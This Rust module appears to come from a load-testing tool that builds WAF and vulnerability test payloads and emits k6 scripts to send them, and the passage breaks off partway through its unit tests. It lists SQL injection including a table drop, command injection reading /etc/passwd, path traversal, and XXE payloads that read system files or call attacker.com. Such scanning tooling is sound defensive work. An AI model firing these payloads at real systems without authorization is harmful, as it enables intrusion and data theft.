//! Security testing payloads for load testing
//!
//! This module provides built-in security testing payloads for common
//! vulnerability categories including SQL injection, XSS, command injection,
//! and path traversal.

use crate::error::{BenchError, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::path::Path;

/// Escape a string for safe use in a JavaScript single-quoted string literal.
/// Handles all problematic characters including:
/// - Backslashes, single quotes, newlines, carriage returns
/// - Backticks (template literals)
/// - Unicode line/paragraph separators (U+2028, U+2029)
/// - Null bytes and other control characters
pub fn escape_js_string(s: &str) -> String {
    let mut result = String::with_capacity(s.len() * 2);
    for c in s.chars() {
        match c {
            '\\' => result.push_str("\\\\"),
            '\'' => result.push_str("\\'"),
            '"' => result.push_str("\\\""),
            '`' => result.push_str("\\`"),
            '\n' => result.push_str("\\n"),
            '\r' => result.push_str("\\r"),
            '\t' => result.push_str("\\t"),
            '\0' => result.push_str("\\0"),
            // Unicode line separator
            '\u{2028}' => result.push_str("\\u2028"),
            // Unicode paragraph separator
            '\u{2029}' => result.push_str("\\u2029"),
            // Other control characters (0x00-0x1F except already handled)
            c if c.is_control() => {
                result.push_str(&format!("\\u{:04x}", c as u32));
            }
            c => result.push(c),
        }
    }
    result
}

/// Security payload categories
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SecurityCategory {
    /// SQL Injection payloads
    SqlInjection,
    /// Cross-Site Scripting (XSS) payloads
    Xss,
    /// Command Injection payloads
    CommandInjection,
    /// Path Traversal payloads
    PathTraversal,
    /// Server-Side Template Injection
    Ssti,
    /// LDAP Injection
    LdapInjection,
    /// XML External Entity (XXE)
    Xxe,
}

impl std::fmt::Display for SecurityCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SqlInjection => write!(f, "sqli"),
            Self::Xss => write!(f, "xss"),
            Self::CommandInjection => write!(f, "command-injection"),
            Self::PathTraversal => write!(f, "path-traversal"),
            Self::Ssti => write!(f, "ssti"),
            Self::LdapInjection => write!(f, "ldap-injection"),
            Self::Xxe => write!(f, "xxe"),
        }
    }
}

impl std::str::FromStr for SecurityCategory {
    type Err = String;

    fn from_str(s: &str) -> std::result::Result<Self, Self::Err> {
        match s.to_lowercase().replace('_', "-").as_str() {
            "sqli" | "sql-injection" | "sqlinjection" => Ok(Self::SqlInjection),
            "xss" | "cross-site-scripting" => Ok(Self::Xss),
            "command-injection" | "commandinjection" | "cmd" => Ok(Self::CommandInjection),
            "path-traversal" | "pathtraversal" | "lfi" => Ok(Self::PathTraversal),
            "ssti" | "template-injection" => Ok(Self::Ssti),
            "ldap-injection" | "ldapinjection" | "ldap" => Ok(Self::LdapInjection),
            "xxe" | "xml-external-entity" => Ok(Self::Xxe),
            _ => Err(format!("Unknown security category: '{}'", s)),
        }
    }
}

/// Where the payload should be injected
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "kebab-case")]
pub enum PayloadLocation {
    /// Payload in URI/query string (default for generic payloads)
    #[default]
    Uri,
    /// Payload in HTTP header
    Header,
    /// Payload in request body
    Body,
}

impl std::fmt::Display for PayloadLocation {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Uri => write!(f, "uri"),
            Self::Header => write!(f, "header"),
            Self::Body => write!(f, "body"),
        }
    }
}

/// A security testing payload
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityPayload {
    /// The payload string to inject
    pub payload: String,
    /// Category of the payload
    pub category: SecurityCategory,
    /// Description of what this payload tests
    pub description: String,
    /// Whether this is considered a high-risk payload
    pub high_risk: bool,
    /// Where to inject the payload (uri, header, body)
    #[serde(default)]
    pub location: PayloadLocation,
    /// Header name if location is Header (e.g., "User-Agent", "Cookie")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub header_name: Option<String>,
    /// Group ID for multi-part payloads that must be sent together in one request
    /// (e.g., CRS test cases with URI + headers + body parts)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub group_id: Option<String>,
    /// When true, URI payload replaces the request path instead of being appended as a query param.
    /// Used for CRS tests where the attack IS the path (e.g., 942101: `POST /1234%20OR%201=1`).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub inject_as_path: Option<bool>,
    /// Raw form-encoded body string for sending as `application/x-www-form-urlencoded`.
    /// Used for CRS tests that send form-encoded data (e.g., 942432: `var=;;dd foo bar`).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub form_encoded_body: Option<String>,
}

impl SecurityPayload {
    /// Create a new security payload
    pub fn new(payload: String, category: SecurityCategory, description: String) -> Self {
        Self {
            payload,
            category,
            description,
            high_risk: false,
            location: PayloadLocation::Uri,
            header_name: None,
            group_id: None,
            inject_as_path: None,
            form_encoded_body: None,
        }
    }

    /// Mark as high risk
    pub fn high_risk(mut self) -> Self {
        self.high_risk = true;
        self
    }

    /// Set the injection location
    pub fn with_location(mut self, location: PayloadLocation) -> Self {
        self.location = location;
        self
    }

    /// Set header name for header payloads
    pub fn with_header_name(mut self, name: String) -> Self {
        self.header_name = Some(name);
        self
    }

    /// Set group ID for multi-part payloads that must be sent together
    pub fn with_group_id(mut self, group_id: String) -> Self {
        self.group_id = Some(group_id);
        self
    }

    /// Mark this URI payload as path injection (replaces path instead of query param)
    pub fn with_inject_as_path(mut self) -> Self {
        self.inject_as_path = Some(true);
        self
    }

    /// Set raw form-encoded body for `application/x-www-form-urlencoded` delivery
    pub fn with_form_encoded_body(mut self, raw: String) -> Self {
        self.form_encoded_body = Some(raw);
        self
    }
}

/// Configuration for security testing
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityTestConfig {
    /// Whether security testing is enabled
    pub enabled: bool,
    /// Categories to test
    pub categories: HashSet<SecurityCategory>,
    /// Specific fields to target for injection
    pub target_fields: Vec<String>,
    /// Path to custom payloads file (extends built-in)
    pub custom_payloads_file: Option<String>,
    /// Whether to include high-risk payloads
    pub include_high_risk: bool,
}

impl Default for SecurityTestConfig {
    fn default() -> Self {
        let mut categories = HashSet::new();
        categories.insert(SecurityCategory::SqlInjection);
        categories.insert(SecurityCategory::Xss);

        Self {
            enabled: false,
            categories,
            target_fields: Vec::new(),
            custom_payloads_file: None,
            include_high_risk: false,
        }
    }
}

impl SecurityTestConfig {
    /// Enable security testing
    pub fn enable(mut self) -> Self {
        self.enabled = true;
        self
    }

    /// Set categories to test
    pub fn with_categories(mut self, categories: HashSet<SecurityCategory>) -> Self {
        self.categories = categories;
        self
    }

    /// Set target fields
    pub fn with_target_fields(mut self, fields: Vec<String>) -> Self {
        self.target_fields = fields;
        self
    }

    /// Set custom payloads file
    pub fn with_custom_payloads(mut self, path: String) -> Self {
        self.custom_payloads_file = Some(path);
        self
    }

    /// Enable high-risk payloads
    pub fn with_high_risk(mut self) -> Self {
        self.include_high_risk = true;
        self
    }

    /// Parse categories from a comma-separated string
    pub fn parse_categories(s: &str) -> std::result::Result<HashSet<SecurityCategory>, String> {
        if s.is_empty() {
            return Ok(HashSet::new());
        }

        s.split(',').map(|c| c.trim().parse::<SecurityCategory>()).collect()
    }
}

/// Built-in security payloads
pub struct SecurityPayloads;

impl SecurityPayloads {
    /// Get SQL injection payloads
    pub fn sql_injection() -> Vec<SecurityPayload> {
        vec![
            SecurityPayload::new(
                "' OR '1'='1".to_string(),
                SecurityCategory::SqlInjection,
                "Basic SQL injection tautology".to_string(),
            ),
            SecurityPayload::new(
                "' OR '1'='1' --".to_string(),
                SecurityCategory::SqlInjection,
                "SQL injection with comment".to_string(),
            ),
            SecurityPayload::new(
                "'; DROP TABLE users; --".to_string(),
                SecurityCategory::SqlInjection,
                "SQL injection table drop attempt".to_string(),
            )
            .high_risk(),
            SecurityPayload::new(
                "' UNION SELECT * FROM users --".to_string(),
                SecurityCategory::SqlInjection,
                "SQL injection union-based data extraction".to_string(),
            ),
            SecurityPayload::new(
                "1' AND '1'='1".to_string(),
                SecurityCategory::SqlInjection,
                "SQL injection boolean-based blind".to_string(),
            ),
            SecurityPayload::new(
                "1; WAITFOR DELAY '0:0:5' --".to_string(),
                SecurityCategory::SqlInjection,
                "SQL injection time-based blind (MSSQL)".to_string(),
            ),
            SecurityPayload::new(
                "1' AND SLEEP(5) --".to_string(),
                SecurityCategory::SqlInjection,
                "SQL injection time-based blind (MySQL)".to_string(),
            ),
        ]
    }

    /// Get XSS payloads
    pub fn xss() -> Vec<SecurityPayload> {
        vec![
            SecurityPayload::new(
                "<script>alert('XSS')</script>".to_string(),
                SecurityCategory::Xss,
                "Basic script tag XSS".to_string(),
            ),
            SecurityPayload::new(
                "<img src=x onerror=alert('XSS')>".to_string(),
                SecurityCategory::Xss,
                "Image tag XSS with onerror".to_string(),
            ),
            SecurityPayload::new(
                "<svg/onload=alert('XSS')>".to_string(),
                SecurityCategory::Xss,
                "SVG tag XSS with onload".to_string(),
            ),
            SecurityPayload::new(
                "javascript:alert('XSS')".to_string(),
                SecurityCategory::Xss,
                "JavaScript protocol XSS".to_string(),
            ),
            SecurityPayload::new(
                "<body onload=alert('XSS')>".to_string(),
                SecurityCategory::Xss,
                "Body tag XSS with onload".to_string(),
            ),
            SecurityPayload::new(
                "'><script>alert(String.fromCharCode(88,83,83))</script>".to_string(),
                SecurityCategory::Xss,
                "XSS with character encoding".to_string(),
            ),
            SecurityPayload::new(
                "<div style=\"background:url(javascript:alert('XSS'))\">".to_string(),
                SecurityCategory::Xss,
                "CSS-based XSS".to_string(),
            ),
        ]
    }

    /// Get command injection payloads
    pub fn command_injection() -> Vec<SecurityPayload> {
        vec![
            SecurityPayload::new(
                "; ls -la".to_string(),
                SecurityCategory::CommandInjection,
                "Unix command injection with semicolon".to_string(),
            ),
            SecurityPayload::new(
                "| cat /etc/passwd".to_string(),
                SecurityCategory::CommandInjection,
                "Unix command injection with pipe".to_string(),
            )
            .high_risk(),
            SecurityPayload::new(
                "$(cat /etc/passwd)".to_string(),
                SecurityCategory::CommandInjection,
                "Unix command substitution".to_string(),
            )
            .high_risk(),
            SecurityPayload::new(
                "`cat /etc/passwd`".to_string(),
                SecurityCategory::CommandInjection,
                "Unix backtick command execution".to_string(),
            )
            .high_risk(),
            SecurityPayload::new(
                "& dir".to_string(),
                SecurityCategory::CommandInjection,
                "Windows command injection".to_string(),
            ),
            SecurityPayload::new(
                "|| ping -c 3 127.0.0.1".to_string(),
                SecurityCategory::CommandInjection,
                "Command injection with OR".to_string(),
            ),
            SecurityPayload::new(
                "\n/bin/sh -c 'echo vulnerable'".to_string(),
                SecurityCategory::CommandInjection,
                "Newline-based command injection".to_string(),
            ),
        ]
    }

    /// Get path traversal payloads
    pub fn path_traversal() -> Vec<SecurityPayload> {
        vec![
            SecurityPayload::new(
                "../../../etc/passwd".to_string(),
                SecurityCategory::PathTraversal,
                "Basic path traversal".to_string(),
            ),
            SecurityPayload::new(
                "..%2F..%2F..%2Fetc%2Fpasswd".to_string(),
                SecurityCategory::PathTraversal,
                "URL-encoded path traversal".to_string(),
            ),
            SecurityPayload::new(
                "....//....//....//etc/passwd".to_string(),
                SecurityCategory::PathTraversal,
                "Double-dot path traversal bypass".to_string(),
            ),
            SecurityPayload::new(
                "..%252f..%252f..%252fetc%252fpasswd".to_string(),
                SecurityCategory::PathTraversal,
                "Double URL-encoded path traversal".to_string(),
            ),
            SecurityPayload::new(
                "/etc/passwd%00.jpg".to_string(),
                SecurityCategory::PathTraversal,
                "Null byte injection path traversal".to_string(),
            ),
            SecurityPayload::new(
                "....\\....\\....\\windows\\system32\\config\\sam".to_string(),
                SecurityCategory::PathTraversal,
                "Windows path traversal".to_string(),
            ),
        ]
    }

    /// Get SSTI payloads
    pub fn ssti() -> Vec<SecurityPayload> {
        vec![
            SecurityPayload::new(
                "{{7*7}}".to_string(),
                SecurityCategory::Ssti,
                "Jinja2/Twig SSTI detection".to_string(),
            ),
            SecurityPayload::new(
                "${7*7}".to_string(),
                SecurityCategory::Ssti,
                "Freemarker SSTI detection".to_string(),
            ),
            SecurityPayload::new(
                "<%= 7*7 %>".to_string(),
                SecurityCategory::Ssti,
                "ERB SSTI detection".to_string(),
            ),
            SecurityPayload::new(
                "#{7*7}".to_string(),
                SecurityCategory::Ssti,
                "Ruby SSTI detection".to_string(),
            ),
        ]
    }

    /// Get LDAP injection payloads
    pub fn ldap_injection() -> Vec<SecurityPayload> {
        vec![
            SecurityPayload::new(
                "*".to_string(),
                SecurityCategory::LdapInjection,
                "LDAP wildcard - match all".to_string(),
            ),
            SecurityPayload::new(
                "*)(&".to_string(),
                SecurityCategory::LdapInjection,
                "LDAP filter injection - close and inject".to_string(),
            ),
            SecurityPayload::new(
                "*)(uid=*))(|(uid=*".to_string(),
                SecurityCategory::LdapInjection,
                "LDAP OR injection to bypass auth".to_string(),
            ),
            SecurityPayload::new(
                "admin)(&)".to_string(),
                SecurityCategory::LdapInjection,
                "LDAP always true injection".to_string(),
            ),
            SecurityPayload::new(
                "x)(|(objectClass=*".to_string(),
                SecurityCategory::LdapInjection,
                "LDAP objectClass enumeration".to_string(),
            ),
            SecurityPayload::new(
                "*)(cn=*".to_string(),
                SecurityCategory::LdapInjection,
                "LDAP CN attribute injection".to_string(),
            ),
            SecurityPayload::new(
                "*)%00".to_string(),
                SecurityCategory::LdapInjection,
                "LDAP null byte injection".to_string(),
            ),
            SecurityPayload::new(
                "*))%00".to_string(),
                SecurityCategory::LdapInjection,
                "LDAP double close with null byte".to_string(),
            ),
        ]
    }

    /// Get XXE (XML External Entity) payloads
    pub fn xxe() -> Vec<SecurityPayload> {
        vec![
            SecurityPayload::new(
                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
                SecurityCategory::Xxe,
                "Basic XXE - read /etc/passwd".to_string(),
            ).high_risk(),
            SecurityPayload::new(
                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>"#.to_string(),
                SecurityCategory::Xxe,
                "Windows XXE - read win.ini".to_string(),
            ).high_risk(),
            SecurityPayload::new(
                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>"#.to_string(),
                SecurityCategory::Xxe,
                "XXE SSRF - external request".to_string(),
            ).high_risk(),
            SecurityPayload::new(
                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>bar</foo>"#.to_string(),
                SecurityCategory::Xxe,
                "External DTD XXE".to_string(),
            ).high_risk(),
            SecurityPayload::new(
                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#.to_string(),
                SecurityCategory::Xxe,
                "PHP expect XXE - command execution".to_string(),
            ).high_risk(),
            SecurityPayload::new(
                r#"<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
                SecurityCategory::Xxe,
                "PHP filter XXE - base64 encoded read".to_string(),
            ).high_risk(),
            SecurityPayload::new(
                r#"<!DOCTYPE foo [<!ENTITY % a "<!ENTITY &#37; b SYSTEM 'file:///etc/passwd'>">%a;%b;]>"#.to_string(),
                SecurityCategory::Xxe,
                "Parameter entity XXE".to_string(),
            ).high_risk(),
            SecurityPayload::new(
                r#"<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd"><foo>&xxe;</foo>"#.to_string(),
                SecurityCategory::Xxe,
                "External DTD reference".to_string(),
            ).high_risk(),
        ]
    }

    /// Get all payloads for a specific category
    pub fn get_by_category(category: SecurityCategory) -> Vec<SecurityPayload> {
        match category {
            SecurityCategory::SqlInjection => Self::sql_injection(),
            SecurityCategory::Xss => Self::xss(),
            SecurityCategory::CommandInjection => Self::command_injection(),
            SecurityCategory::PathTraversal => Self::path_traversal(),
            SecurityCategory::Ssti => Self::ssti(),
            SecurityCategory::LdapInjection => Self::ldap_injection(),
            SecurityCategory::Xxe => Self::xxe(),
        }
    }

    /// Get all payloads for configured categories
    pub fn get_payloads(config: &SecurityTestConfig) -> Vec<SecurityPayload> {
        let mut payloads: Vec<SecurityPayload> =
            config.categories.iter().flat_map(|c| Self::get_by_category(*c)).collect();

        // Filter out high-risk if not included
        if !config.include_high_risk {
            payloads.retain(|p| !p.high_risk);
        }

        payloads
    }

    /// Load custom payloads from a file
    pub fn load_custom_payloads(path: &Path) -> Result<Vec<SecurityPayload>> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| BenchError::Other(format!("Failed to read payloads file: {}", e)))?;

        serde_json::from_str(&content)
            .map_err(|e| BenchError::Other(format!("Failed to parse payloads file: {}", e)))
    }
}

/// Generates k6 JavaScript code for security testing
pub struct SecurityTestGenerator;

impl SecurityTestGenerator {
    /// Generate k6 code for security payload selection
    /// When cycle_all is true, payloads are cycled through sequentially instead of randomly
    pub fn generate_payload_selection(payloads: &[SecurityPayload], cycle_all: bool) -> String {
        let mut code = String::new();

        code.push_str("// Security testing payloads\n");
        code.push_str(&format!("// Total payloads: {}\n", payloads.len()));
        code.push_str("const securityPayloads = [\n");

        for payload in payloads {
            // Escape the payload for JavaScript string literal
            let escaped = escape_js_string(&payload.payload);
            let escaped_desc = escape_js_string(&payload.description);
            let header_name = payload
                .header_name
                .as_ref()
                .map(|h| format!("'{}'", escape_js_string(h)))
                .unwrap_or_else(|| "null".to_string());
            let group_id = payload
                .group_id
                .as_ref()
                .map(|g| format!("'{}'", escape_js_string(g)))
                .unwrap_or_else(|| "null".to_string());

            let inject_as_path = if payload.inject_as_path == Some(true) {
                "true".to_string()
            } else {
                "false".to_string()
            };
            let form_body = payload
                .form_encoded_body
                .as_ref()
                .map(|b| format!("'{}'", escape_js_string(b)))
                .unwrap_or_else(|| "null".to_string());

            code.push_str(&format!(
                "  {{ payload: '{}', category: '{}', description: '{}', location: '{}', headerName: {}, groupId: {}, injectAsPath: {}, formBody: {} }},\n",
                escaped, payload.category, escaped_desc, payload.location, header_name, group_id, inject_as_path, form_body
            ));
        }

        code.push_str("];\n\n");

        // Build grouped payloads: entries sharing a groupId are collected together,
        // ungrouped entries become single-element arrays
        code.push_str(
            "// Grouped payloads: multi-part test cases are sent together in one request\n",
        );
        code.push_str("const groupedPayloads = (function() {\n");
        code.push_str("  const groups = [];\n");
        code.push_str("  const groupMap = {};\n");
        code.push_str("  for (const p of securityPayloads) {\n");
        code.push_str("    if (p.groupId) {\n");
        code.push_str("      if (!groupMap[p.groupId]) {\n");
        code.push_str("        groupMap[p.groupId] = [];\n");
        code.push_str("        groups.push(groupMap[p.groupId]);\n");
        code.push_str("      }\n");
        code.push_str("      groupMap[p.groupId].push(p);\n");
        code.push_str("    } else {\n");
        code.push_str("      groups.push([p]);\n");
        code.push_str("    }\n");
        code.push_str("  }\n");
        code.push_str("  return groups;\n");
        code.push_str("})();\n\n");

        if cycle_all {
            // Cycle through all payload groups sequentially
            code.push_str("// Cycle through ALL payload groups sequentially\n");
            code.push_str("// Each VU starts at a different offset based on its VU number for better payload distribution\n");
            code.push_str("let __payloadIndex = (__VU - 1) % groupedPayloads.length;\n");
            code.push_str("function getNextSecurityPayload() {\n");
            code.push_str("  const group = groupedPayloads[__payloadIndex];\n");
            code.push_str("  __payloadIndex = (__payloadIndex + 1) % groupedPayloads.length;\n");
            code.push_str("  return group;\n");
            code.push_str("}\n\n");
        } else {
            // Random selection (original behavior)
            code.push_str("// Select random security payload group\n");
            code.push_str("function getNextSecurityPayload() {\n");
            code.push_str(
                "  return groupedPayloads[Math.floor(Math.random() * groupedPayloads.length)];\n",
            );
            code.push_str("}\n\n");
        }

        code
    }

    /// Generate k6 code for applying security payload to request
    pub fn generate_apply_payload(target_fields: &[String]) -> String {
        let mut code = String::new();

        code.push_str("// Apply security payload to request body\n");
        code.push_str("// For POST/PUT/PATCH requests, inject ALL payloads into body for effective WAF testing\n");
        code.push_str("// Injects into ALL string fields to maximize WAF detection surface area\n");
        code.push_str("function applySecurityPayload(payload, targetFields, secPayload) {\n");
        code.push_str("  const result = { ...payload };\n");
        code.push_str("  \n");

        if target_fields.is_empty() {
            code.push_str("  // No specific target fields - inject into ALL string fields for maximum coverage\n");
            code.push_str(
                "  // This ensures WAF can detect payloads regardless of which field it scans\n",
            );
            code.push_str("  const keys = Object.keys(result);\n");
            code.push_str("  if (keys.length === 0 && secPayload.location === 'body') {\n");
            code.push_str("    // Empty body object - add a test field with the payload\n");
            code.push_str("    result.__test = secPayload.payload;\n");
            code.push_str("  } else {\n");
            code.push_str("    for (const key of keys) {\n");
            code.push_str("      if (typeof result[key] === 'string') {\n");
            code.push_str("        result[key] = secPayload.payload;\n");
            code.push_str("      }\n");
            code.push_str("    }\n");
            code.push_str("  }\n");
        } else {
            code.push_str("  // Inject into specified target fields\n");
            code.push_str("  for (const field of targetFields) {\n");
            code.push_str("    if (result.hasOwnProperty(field)) {\n");
            code.push_str("      result[field] = secPayload.payload;\n");
            code.push_str("    }\n");
            code.push_str("  }\n");
        }

        code.push_str("  \n");
        code.push_str("  return result;\n");
        code.push_str("}\n");

        code
    }

    /// Generate k6 code for security test checks
    pub fn generate_security_checks() -> String {
        r#"// Security test response checks
function checkSecurityResponse(res, expectedVulnerable) {
  // Check for common vulnerability indicators
  const body = res.body || '';

  const vulnerabilityIndicators = [
    // SQL injection
    'SQL syntax',
    'mysql_fetch',
    'ORA-',
    'PostgreSQL',

    // Command injection
    'root:',
    '/bin/',
    'uid=',

    // Path traversal
    '[extensions]',
    'passwd',

    // XSS (reflected)
    '<script>alert',
    'onerror=',

    // Error disclosure
    'stack trace',
    'Exception',
    'Error in',
  ];

  const foundIndicator = vulnerabilityIndicators.some(ind =>
    body.toLowerCase().includes(ind.toLowerCase())
  );

  if (foundIndicator) {
    console.warn(`POTENTIAL VULNERABILITY: ${securityPayload.description}`);
    console.warn(`Category: ${securityPayload.category}`);
    console.warn(`Status: ${res.status}`);
  }

  return check(res, {
    'security test: no obvious vulnerability': () => !foundIndicator,
    'security test: proper error handling': (r) => r.status < 500,
  });
}
"#
        .to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::str::FromStr;

    #[test]
    fn test_security_category_display() {
        assert_eq!(SecurityCategory::SqlInjection.to_string(), "sqli");
        assert_eq!(SecurityCategory::Xss.to_string(), "xss");
        assert_eq!(SecurityCategory::CommandInjection.to_string(), "command-injection");
        assert_eq!(SecurityCategory::PathTraversal.to_string(), "path-traversal");
    }

    #[test]
    fn test_security_category_from_str() {
        assert_eq!(SecurityCategory::from_str("sqli").unwrap(), SecurityCategory::SqlInjection);
        assert_eq!(
            SecurityCategory::from_str("sql-injection").unwrap(),
            SecurityCategory::SqlInjection
        );
        assert_eq!(SecurityCategory::from_str("xss").unwrap(), SecurityCategory::Xss);
        assert_eq!(
            SecurityCategory::from_str("command-injection").unwrap(),
            SecurityCategory::CommandInjection
        );
    }

    #[test]
    fn test_security_category_from_str_invalid() {
        assert!(SecurityCategory::from_str("invalid").is_err());
    }

    #[test]
    fn test_security_test_config_default() {
        let config = SecurityTestConfig::default();
        assert!(!config.enabled);
        assert!(config.categories.contains(&SecurityCategory::SqlInjection));
        assert!(config.categories.contains(&SecurityCategory::Xss));
        assert!(!config.include_high_risk);
    }

    #[test]
    fn test_security_test_config_builders() {
        let mut categories = HashSet::new();
        categories.insert(SecurityCategory::CommandInjection);

        let config = SecurityTestConfig::default()
            .enable()
            .with_categories(categories)
            .with_target_fields(vec!["name".to_string()])
            .with_high_risk();

        assert!(config.enabled);
        assert!(config.categories.contains(&SecurityCategory::CommandInjection));
        assert!(!config.categories.contains(&SecurityCategory::SqlInjection));
        assert_eq!(config.target_fields, vec!["name"]);
        assert!(config.include_high_risk);
    }

    #[test]
    fn test_parse_categories() {
        let categories = SecurityTestConfig::parse_categories("sqli,xss,path-traversal").unwrap();
        assert_eq!(categories.len(), 3);
        assert!(categories.contains(&SecurityCategory::SqlInjection));
        assert!(categories.contains(&SecurityCategory::Xss));
        assert!(categories.contains(&SecurityCategory::PathTraversal));
    }

    #[test]
    fn test_sql_injection_payloads() {
        let payloads = SecurityPayloads::sql_injection();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.category == SecurityCategory::SqlInjection));
        assert!(payloads.iter().any(|p| p.payload.contains("OR")));
    }

    #[test]
    fn test_xss_payloads() {
        let payloads = SecurityPayloads::xss();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.category == SecurityCategory::Xss));
        assert!(payloads.iter().any(|p| p.payload.contains("<script>")));
    }

    #[test]
    fn test_command_injection_payloads() {
        let payloads = SecurityPayloads::command_injection();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.category == SecurityCategory::CommandInjection));
    }

    #[test]
    fn test_path_traversal_payloads() {
        let payloads = SecurityPayloads::path_traversal();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.category == SecurityCategory::PathTraversal));
        assert!(payloads.iter().any(|p| p.payload.contains("..")));
    }

    #[test]
    fn test_get_payloads_filters_high_risk() {
        let config = SecurityTestConfig::default();
        let payloads = SecurityPayloads::get_payloads(&config);

        // Should not include high-risk payloads by default
        assert!(payloads.iter().all(|p| !p.high_risk));
    }

    #[test]
    fn test_get_payloads_includes_high_risk() {
        let config = SecurityTestConfig::default().with_high_risk();
        let payloads = SecurityPayloads::get_payloads(&config);

        // Should include some high-risk payloads
        assert!(payloads.iter().any(|p| p.high_risk));
    }

    #[test]
    fn test_generate_payload_selection_random() {
        let payloads = vec![SecurityPayload::new(
            "' OR '1'='1".to_string(),
            SecurityCategory::SqlInjection,
            "Basic SQLi".to_string(),
        )];

        let code = SecurityTestGenerator::generate_payload_selection(&payloads, false);
        assert!(code.contains("securityPayloads"));
        assert!(code.contains("groupedPayloads"));
        assert!(code.contains("OR"));
        assert!(code.contains("Math.random()"));
        assert!(code.contains("getNextSecurityPayload"));
        // getNextSecurityPayload should return from groupedPayloads (arrays)
        assert!(code.contains("groupedPayloads[Math.floor"));
    }

    #[test]
    fn test_generate_payload_selection_cycle_all() {
        let payloads = vec![SecurityPayload::new(
            "' OR '1'='1".to_string(),
            SecurityCategory::SqlInjection,
            "Basic SQLi".to_string(),
        )];

        let code = SecurityTestGenerator::generate_payload_selection(&payloads, true);
        assert!(code.contains("securityPayloads"));
        assert!(code.contains("groupedPayloads"));
        assert!(code.contains("Cycle through ALL payload groups"));
        assert!(code.contains("__payloadIndex"));
        assert!(code.contains("getNextSecurityPayload"));
        assert!(!code.contains("Math.random()"));
        // Verify VU-based offset for better payload distribution across VUs
        assert!(
            code.contains("(__VU - 1) % groupedPayloads.length"),
            "Should use VU-based offset for payload distribution"
        );
    }

    #[test]
    fn test_generate_payload_selection_with_group_id() {
        let payloads = vec![
            SecurityPayload::new(
                "/test?param=attack".to_string(),
                SecurityCategory::SqlInjection,
                "URI part".to_string(),
            )
            .with_group_id("942290-1".to_string()),
            SecurityPayload::new(
                "ModSecurity CRS 3 Tests".to_string(),
                SecurityCategory::SqlInjection,
                "Header part".to_string(),
            )
            .with_location(PayloadLocation::Header)
            .with_header_name("User-Agent".to_string())
            .with_group_id("942290-1".to_string()),
        ];

        let code = SecurityTestGenerator::generate_payload_selection(&payloads, false);
        assert!(code.contains("groupId: '942290-1'"), "Grouped payloads should have groupId set");
        assert!(code.contains("groupedPayloads"), "Should emit groupedPayloads array-of-arrays");
    }

    #[test]
    fn test_generate_payload_selection_ungrouped_null_group_id() {
        let payloads = vec![SecurityPayload::new(
            "' OR '1'='1".to_string(),
            SecurityCategory::SqlInjection,
            "Basic SQLi".to_string(),
        )];

        let code = SecurityTestGenerator::generate_payload_selection(&payloads, false);
        assert!(code.contains("groupId: null"), "Ungrouped payloads should have groupId: null");
    }

    #[test]
    fn test_generate_payload_selection_inject_as_path() {
        let payloads = vec![SecurityPayload::new(
            "1234 OR 1=1".to_string(),
            SecurityCategory::SqlInjection,
            "Path-based SQLi".to_string(),
        )
        .with_inject_as_path()];

        let code = SecurityTestGenerator::generate_payload_selection(&payloads, false);
        assert!(
            code.contains("injectAsPath: true"),
            "Path injection payloads should have injectAsPath: true"
        );
        assert!(code.contains("formBody: null"), "Non-form payloads should have formBody: null");
    }

    #[test]
    fn test_generate_payload_selection_form_body() {
        let payloads = vec![SecurityPayload::new(
            ";;dd foo bar".to_string(),
            SecurityCategory::SqlInjection,
            "Form-encoded body".to_string(),
        )
        .with_location(PayloadLocation::Body)
        .with_form_encoded_body("var=;;dd foo bar".to_string())];

        let code = SecurityTestGenerator::generate_payload_selection(&payloads, false);
        assert!(
            code.contains("formBody: 'var=;;dd foo bar'"),
            "Form-encoded payloads should have formBody set"
        );
        assert!(
            code.contains("injectAsPath: false"),
            "Body payloads should have injectAsPath: false"
        );
    }

    #[test]
    fn test_generate_payload_selection_default_fields() {
        let payloads = vec![SecurityPayload::new(
            "' OR '1'='1".to_string(),
            SecurityCategory::SqlInjection,
            "Basic SQLi".to_string(),
        )];

        let code = SecurityTestGenerator::generate_payload_selection(&payloads, false);
        assert!(
            code.contains("injectAsPath: false"),
            "Default payloads should have injectAsPath: false"
        );
        assert!(code.contains("formBody: null"), "Default payloads should have formBody: null");
    }

    #[test]
    fn test_generate_apply_payload_no_targets() {
        let code = SecurityTestGenerator::generate_apply_payload(&[]);
        assert!(code.contains("applySecurityPayload"));
